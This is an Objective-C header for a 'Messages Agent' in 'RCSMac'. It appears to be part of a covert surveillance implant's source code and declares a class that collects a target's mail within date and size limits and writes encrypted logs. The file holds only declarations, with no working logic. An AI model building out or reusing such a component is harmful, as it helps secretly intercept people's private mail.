/*
 * RCSMAgentMessages.h
 * RCSMac 
 * Messages Agent
 *
 *
 * Created by J on 06/03/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSMAgentMessages_h__
#define __RCSMAgentMessages_h__

#import "RCSMLogManager.h"
#import "RCSMEncryption.h"

//#define MAPI_V2_0_PROTO  2009070301
#define MAIL_VERSION2  2012030601
#define MAIL_FULL_BODY  0x00000001
#define PROGRAM_MAIL  0x00000005
#define MAIL_INCOMING  0x00000010

typedef struct _messagesAdditionalHeader{
    u_int32_t version;
    u_int32_t flags;
    u_int32_t size;
    u_int32_t lowDatetime;
    u_int32_t highDatetime;
    u_int32_t program;
} messagesAdditionalHeader;


@interface __m_MAgentMessages : NSObject <Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    NSDate *dateTo;
    NSDate *dateFrom;
    NSInteger size;
    NSMutableDictionary *markup;
    NSString *markupFile;
    NSString *inAddr;  // the address associated to the Mail account
}

+ (__m_MAgentMessages *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;


@end


#endif